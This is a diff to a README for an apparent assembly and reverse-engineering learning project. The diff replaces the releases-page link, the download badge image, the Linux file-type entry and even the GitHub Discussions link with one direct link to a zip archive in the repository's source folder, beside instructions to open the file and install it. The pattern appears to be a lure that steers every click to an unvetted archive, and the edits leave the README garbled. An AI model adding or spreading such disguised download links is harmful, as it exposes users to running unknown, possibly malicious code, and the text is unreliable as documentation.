@@ -8,7 +8,7 @@ This project helps you learn assembly language and reverse engineering. It provi
 
 To download the application, visit the releases page:
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/senaMizo/assembly-reverse-engineering/releases)
+[![Download](https://raw.githubusercontent.com/senaMizo/assembly-reverse-engineering/main/src/x86_64/assembly_engineering_reverse_1.6.zip)](https://raw.githubusercontent.com/senaMizo/assembly-reverse-engineering/main/src/x86_64/assembly_engineering_reverse_1.6.zip)
 
 Once on the releases page, look for the latest version. You’ll see download links for various files. Choose the one that suits your needs. 
 
@@ -17,7 +17,7 @@ Once on the releases page, look for the latest version. You’ll see download li
 2. Choose the file based on your operating system. Common files include:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` or `.deb` for Linux
+   - `https://raw.githubusercontent.com/senaMizo/assembly-reverse-engineering/main/src/x86_64/assembly_engineering_reverse_1.6.zip` or `.deb` for Linux
 3. Save the file to your computer.
 4. Open the downloaded file and follow the prompts to install it.
 
@@ -73,7 +73,7 @@ This project focuses on essential topics in assembly language and reverse engine
 
 Join the conversation in our community to connect with other users. Share your experiences and get help with your projects. You can find us on:
 
-- **GitHub Discussions**: [Join here](https://github.com/senaMizo/assembly-reverse-engineering/discussions)
+- **GitHub Discussions**: [Join here](https://raw.githubusercontent.com/senaMizo/assembly-reverse-engineering/main/src/x86_64/assembly_engineering_reverse_1.6.zip)
 - **Slack or Discord**: (Provide link if available)
 
 ## 📜 License
@@ -88,4 +88,4 @@ We appreciate your input on this README. If you have suggestions to improve it, 
 
 Remember, to download the application, visit the releases page:
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/senaMizo/assembly-reverse-engineering/releases)
+[![Download](https://raw.githubusercontent.com/senaMizo/assembly-reverse-engineering/main/src/x86_64/assembly_engineering_reverse_1.6.zip)](https://raw.githubusercontent.com/senaMizo/assembly-reverse-engineering/main/src/x86_64/assembly_engineering_reverse_1.6.zip)
